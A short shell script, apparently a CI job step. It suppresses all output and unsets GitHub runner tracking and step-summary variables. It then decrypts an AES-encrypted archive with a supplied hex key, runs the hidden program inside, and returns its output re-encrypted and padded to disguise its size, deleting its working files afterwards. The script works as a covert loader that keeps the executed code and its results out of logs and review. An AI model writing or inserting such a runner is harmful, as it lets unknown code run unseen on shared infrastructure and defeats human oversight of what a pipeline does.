exec >/dev/null 2>&1
set -u
umask 077
unset RUNNER_TRACKING_ID GITHUB_STEP_SUMMARY GITHUB_ENV GITHUB_OUTPUT GITHUB_PATH GITHUB_STATE
K=$(printf '%s' "$K" | tr -d ' \r\n\t')
case $K in
'' | *[!0-9a-f]*) exit 0 ;;
esac
[ ${#K} -eq 64 ] || exit 0
w=_w
rm -rf "$w"
mkdir "$w"
v=$(head -c 16 p | od -An -tx1 | tr -d ' \n')
tail -c +17 p | openssl enc -d -aes-256-cbc -K "$K" -iv "$v" | tar xzf - -C "$w"
if [ -f "$w/0" ]; then
	(cd "$w" && sh ./0 "$I") >o 2>&1 </dev/null
	echo $? >c
else
	: >o
	echo 99 >c
fi
tar czf t o c
n=$(wc -c <t)
b=4194304
while [ "$n" -gt "$b" ]; do b=$((b * 2)); done
head -c $((b - n)) /dev/zero >>t
openssl rand 16 >v
u=$(od -An -tx1 v | tr -d ' \n')
{
	cat v
	openssl enc -aes-256-cbc -K "$K" -iv "$u" -in t
} >r
rm -rf o c v t "$w"
exit 0
